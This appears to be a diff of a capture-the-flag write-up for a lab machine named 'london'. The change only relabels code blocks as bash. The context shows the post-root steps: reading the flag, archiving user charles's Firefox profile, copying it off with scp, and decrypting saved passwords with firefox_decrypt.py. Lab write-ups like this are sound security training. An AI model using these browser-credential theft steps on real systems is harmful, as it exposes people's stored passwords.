@@ -282,14 +282,14 @@ root@london:~#
 
 Root access was confirmed:
 
-```cpp
+```bash
 root@london:~# id
 uid=0(root) gid=0(root) groups=0(root),1000(beth)
 ```
 
 With full privileges obtained, analyzed the root directory:
 
-```cpp
+```bash
 root@london:/root# ls -la
 total 52
 drwx------  6 root root 4096 Apr 23  2024 .
@@ -310,7 +310,7 @@ drwxr-xr-x  2 root root 4096 Mar 16  2024 __pycache__
 
 Found the password:
 
-```abap
+```bash
 root@london:/root# cat .root.txt
 THM{REDACTED}
 ```
@@ -321,7 +321,7 @@ The final objective of the room is to recover the password for the user `charles
 
 After obtaining root access, the home directory of `charles` was inspected. A `.mozilla` directory was present, indicating a Firefox profile that may contain saved credentials.
 
-```cpp
+```bash
 root@london:/home/charles# ls -la
 total 24
 drw------- 3 charles charles 4096 Apr 23  2024 .
@@ -337,7 +337,7 @@ drw------- 3 charles charles 4096 Feb  4 12:37 .mozilla
 
 Inside `.mozilla`, a Firefox profile directory was found:
 
-```cpp
+```bash
 root@london:/home/charles/.mozilla# ls -la
 total 12
 drw------- 3 charles charles 4096 Feb  4 12:39 .
@@ -347,7 +347,7 @@ drw------- 3 charles charles 4096 Feb  4 12:37 firefox
 
 Since Firefox can store saved credentials locally, the profile directory was archived for offline analysis:
 
-```abap
+```bash
 root@london:/home/charles/.mozilla# tar -cvzf /tmp/firefox.tar.gz firefox
 ```
 
@@ -361,13 +361,13 @@ $ scp -i key beth@10.67.142.188:/tmp/firefox.tar.gz .
 
 After extracting the archive locally:
 
-```abap
+```bash
 tar -xvzf firefox.tar.gz
 ```
 
 The Firefox credentials were decrypted using `firefox_decrypt.py`:
 
-```abap
+```bash
 $ python3 firefox_decrypt.py firefox/8k3bf3zp.charles
 ```
 
